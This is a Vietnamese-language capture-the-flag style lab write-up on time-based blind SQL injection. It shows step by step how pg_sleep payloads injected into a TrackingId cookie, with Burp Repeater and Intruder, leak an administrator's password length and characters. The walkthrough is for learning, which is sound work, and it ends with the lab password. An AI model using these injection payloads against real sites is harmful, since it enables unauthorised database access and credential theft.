# Blind SQL injection with time delays and information retrieval

## B1: Phân tích yêu cầu bài lab

Đề bài có các dữ liệu sau:
- Ứng dụng sử dụng một cookie theo dõi cho mục phân tích và thực hiện một truy vấn SQL chứa giá trị của cookie được gửi lên.
- Kết quả của truy vấn SQL không được trả về, và ứng dụng không có phản hồi khác biệt dựa trên việc truy vấn có trả về hàng hay gây lỗi hay không. Đề bài gợi ý có thể kích hoạt các độ trễ có điều kiện (conditional time delays) để suy luận thông tin.

Yêu cầu của bài lab:
- Có 1 bảng user, với các cột username và password. Cần khai thác lỗ hổng blind SQL injection này để tìm mật khẩu và đăng nhập với quyền user administrator

## B2: Bật Burp Suite và intercept gói tin, gửi gói tin đã chặn được tới Reapeater và chỉnh sửa

![Hình 1 – Giao diện của bài lab](images/image_1.png)

- Gửi gói tin đã chặn được tới Reapeater và chỉnh sửa giá trị cookie TrackingId thành:

TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--

+1=1 luôn đúng.

+Hệ quả: câu lệnh sẽ gọi pg_sleep(5), ứng dụng mất 5 giây để phản hồi.

+Mục đích: kiểm tra xem server có thực thi payload time-based và trả về theo thời gian.

![Hình 2 - Payload: ... CASE WHEN (1=1) THEN pg_sleep(5) ...]( images/image_2.png)


- Tiếp theo thay bằng

TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--;

+1=2 luôn sai.

+Hệ quả: sẽ chạy pg_sleep(0). Dẫn đến không có delay, response trả ngay.

+Mục đích: xác nhận rằng chỉ khi điều kiện đúng mới có delay, nên ta có thể dùng delay để biểu thị boolean true/false.

![Hình 3 -  Payload: ... CASE WHEN (1=2) THEN pg_sleep(5) ...]( images/image_3.png)

-Tiếp theo thay bằng:

TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users—

![Hình 4 – Payload: ... CASE WHEN (username='administrator') THEN pg_sleep(10) ... FROM users]( images/image_4.png)

Response trả về delay 5s, vậy có thể suy luận rằng bảng users có username administrator

## B3: Xác định password có bao nhiêu kí tự
- Thay giá trị cookie thành:

TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users—

![Hình 5 – Kiểm tra với điều kiện độ dài password > 1](images/image_5.png)

Response delay 5s, vậy độ dài mật khẩu lớn hơn 1 ký tự.

- Thay giá trị cookie thành:

TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>5)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users—

![Hình 6 - Kiểm tra với điều kiện độ dài password > 5](images/image_6.png)

Response delay 5s, vậy độ dài mật khẩu lớn hơn 5 ký tự.

- Thay giá trị cookie thành:

TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>10)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users—

![Hình 7 - Kiểm tra với điều kiện độ dài password > 10](images/image_7.png)

Response delay 5s, vậy độ dài mật khẩu lớn hơn 10 ký tự.

- Thay giá trị cookie thành:

TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users—

![Hình 8 - Kiểm tra với điều kiện độ dài password > 20](images/image_8.png)

Response không bị delay, độ dài mật khẩu <= 20

- Thay giá trị cookie thành:

TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users—

![Hình 9 - Kiểm tra với điều kiện độ dài password = 20](images/image_9.png)

Response delay 5s, vậy **độ dài mật khẩu = 20**.

- Sử dụng hàm SUBSTRING() để trích một ký tự đơn từ mật khẩu và so sánh với một giá trị cụ thể:

TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--

![Hình 10 - Kiểm tra ký tự đơn với hàm SUBSTRING()](images/image_10.png)

Response không bị delay, vậy kí tự đầu tiên không phải là kí tự ‘a’


## B4: Gửi request tới Burp Intruder để tự động hóa việc gửi nhiều payload

- Chọn Cluster bomb attack và Add $ cho số ‘1’(payload 1) và kí tự ‘a’(payload 2)
![Hình 11 - Chọn Cluster bomb attack và Add $ cho số ‘1’ và kí tự ‘a’](images/image_11.png)

- Payload 1:
![Hình 12 – Payload 1](images/image_12.png)

- Payload 2:
![Hình 13 – Payload 2](images/image_13.png)

- Start attack và kết quả:

Vì request nào delay lâu thì có khả năng nó sẽ true, lọc nhưng request có nhưng response received lớn bất thường và lấy payload 1 và payload 2 tương ứng của nó
![Hình 14 – Start Attack](images/image_14.png)
![Hình 15 – Start Attack](images/image_15.png)
![Hình 16 – Start Attack](images/image_16.png)
![Hình 17 – Start Attack](images/image_17.png)
![Hình 18 – Start Attack](images/image_18.png)
![Hình 19 – Start Attack](images/image_19.png)
![Hình 20 – Start Attack](images/image_20.png)
![Hình 21 – Start Attack](images/image_21.png)
![Hình 22 – Start Attack](images/image_22.png)
![Hình 23 – Start Attack](images/image_23.png)
![Hình 24 – Start Attack](images/image_24.png)
![Hình 25 – Start Attack](images/image_25.png)
![Hình 26 – Start Attack](images/image_26.png)
![Hình 27 – Start Attack](images/image_27.png)
![Hình 28 – Start Attack](images/image_28.png)
![Hình 29 – Start Attack](images/image_29.png)
![Hình 30 – Đã hoàn thành lab](images/image_30.png)

**Password = 4obgcylbwe7npf6rsx1y**

